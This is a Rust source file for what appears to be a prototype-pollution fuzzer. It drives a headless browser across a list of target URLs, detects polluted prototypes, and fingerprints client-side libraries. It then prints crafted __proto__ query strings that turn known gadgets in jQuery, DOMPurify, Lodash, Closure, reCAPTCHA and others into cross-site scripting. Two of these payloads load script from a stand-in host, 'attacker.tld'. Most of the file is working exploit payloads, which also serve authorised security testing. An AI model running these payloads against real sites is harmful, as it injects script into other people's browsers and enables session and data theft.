use {
	chromiumoxide::Browser,
	colored::*,
	futures::{StreamExt, stream},
	std::sync::Arc,
	url::Url
};

use crate::parser;

static CHECK_SCRIPT: &str = "(window.ppfuzz || Object.prototype.ppfuzz) == 'reserved' && true || false";

pub async fn new(urls: Vec<String>, browser: Browser, opt: parser::Options) {
	let browser = Arc::new(browser);
	let mut stream = stream::iter(urls.into_iter()
		.map(|url| (url, Arc::clone(&browser)))
		.map(|(url, browser)| async move {
			let is_err: bool = false;
			let mut detail: String = String::new();
			let page = match browser.new_page(&url).await {
				Ok(res) => res,
				Err(err) => {
					detail = err.to_string();
					return Ok((url, false, !is_err, detail, None))
				}
			};
			let vuln: bool = match page.evaluate(CHECK_SCRIPT).await {
				Ok(res) => res.into_value().unwrap(),
				Err(_) => false
			};

			Ok::<_, Box<dyn std::error::Error>>
			((url, vuln, is_err, detail, Some(page)))
		}
	)).buffer_unordered(opt.concurrency);

	while let Some(res) = stream.next().await {
		if let Ok((ref url, vuln, is_err, detail, page)) = res {
			if vuln {
				println!("[{}] {}", "VULN".green(), url);

				let mut target = Url::parse(url).unwrap();
				target.set_query(None);

				if let Some(ref p) = page {
					let gadgets: Vec<String> = p
						.evaluate(
							include_str!("fingerprint.js")
						)
						.await
						.unwrap()
						.into_value()
						.unwrap();


					escalate(target.to_string(), gadgets);
				}
			} else {
				let mut msg = format!("[{}] {}", "ERRO".red(), url);
				if is_err {
					let det = format!("({})", detail);
					msg = format!("{} {}", msg, det.yellow());
				}

				eprintln!("{}", msg)
			}

			if let Some(p) = page {
				p.close().await.unwrap();
			}
		}
	}
}

fn escalate(target: String, gadgets: Vec<String>) {
	for gadget in gadgets.iter() {
		if gadget == "Adobe Dynamic Tag Management" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[src]",
							"data:,alert(1)//"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Akai Boomerang" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[BOOMR]",
							"1"
						),
						(
							"__proto__[url]",
							"//attacker.tld/js.js"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Closure" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[* ONERROR]",
							"1"
						),
						(
							"__proto__[* SRC]",
							"1"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[CLOSURE_BASE_PATH]",
							"data:,alert(1)//"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "DOMPurify" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[ALLOWED_ATTR][0]",
							"onerror"
						),
						(
							"__proto__[ALLOWED_ATTR][1]",
							"src"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[documentMode]",
							"9"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Embedly" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[onload]",
							"alert(1)"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "jQuery" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[context]",
							"<img/src/onerror=alert(1)>"
						),
						(
							"__proto__[jquery]",
							"x"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[url][]",
							"data:,alert(1)//"
						),
						(
							"__proto__[dataType]",
							"script"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[url]",
							"data:,alert(1)//"
						),
						(
							"__proto__[dataType]",
							"script"
						),
						(
							"__proto__[crossDomain]",
							""
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[src][]",
							"data:,alert(1)//"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[url]",
							"data:,alert(1)//"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[div][0]",
							"1"
						),
						(
							"__proto__[div][1]",
							"<img/src/onerror=alert(1)>"
						),
						(
							"__proto__[div][2]",
							"1"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[preventDefault]",
							"x"
						),
						(
							"__proto__[handleObj][]",
							"x"
						),
						(
							"__proto__[delegateTarget]",
							"<img/src/onerror=alert(1)>"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);
		}

		if gadget == "js-xss" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[whiteList][img][0]",
							"onerror"
						),
						(
							"__proto__[whiteList][img][1]",
							"src"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Knockout.js" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[4]",
							"a':1,[alert(1)]:1,'b"
						),
						(
							"__proto__[5]",
							","
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Lodash <= 4.17.15" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[sourceURL]",
							"  alert(1)"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Marionette.js / Backbone.js" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[tagName]",
							"img"
						),
						(
							"__proto__[src][]",
							"x:"
						),
						(
							"__proto__[onerror][]",
							"alert(1)"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Google reCAPTCHA" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[srcdoc][]",
							"<script>alert(1)</script>"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "sanitize-html" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[*][]",
							"onload"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			);

			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[innerText]",
							"<script>alert(1)</script>"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Segment Analytics.js" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[script][0]",
							"1"
						),
						(
							"__proto__[script][1]",
							"<img/src/onerror=alert(1)>"
						),
						(
							"__proto__[script][2]",
							"1"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Sprint.js" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[div][intro]",
							"<img src onerror=alert(1)>"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Swiftype Site Search" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[xxx]",
							"alert(1)"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Tealium Universal Tag" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[attrs][src]",
							"1"
						),
						(
							"__proto__[src]",
							"//attacker.tld/js.js"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Twitter Universal Website Tag" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[attrs][src]",
							"1"
						),
						(
							"__proto__[hif][]",
							"javascript:alert(1)"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Wistia Embedded Video" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[innerHTML]",
							"<img/src/onerror=alert(1)>"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}

		if gadget == "Zepto.js" {
			show_pontential(
				Url::parse_with_params(
					&target,
					&[
						(
							"__proto__[onerror]",
							"alert(1)"
						)
					]
				)
				.unwrap()
				.as_str(), gadget
			)
		}
	}
}

fn show_pontential(url: &str, gadget: &str) {
	let gad = format!("({})", gadget);
	println!("[{}] {} {}", "INFO".blue(), url, gad.green());
}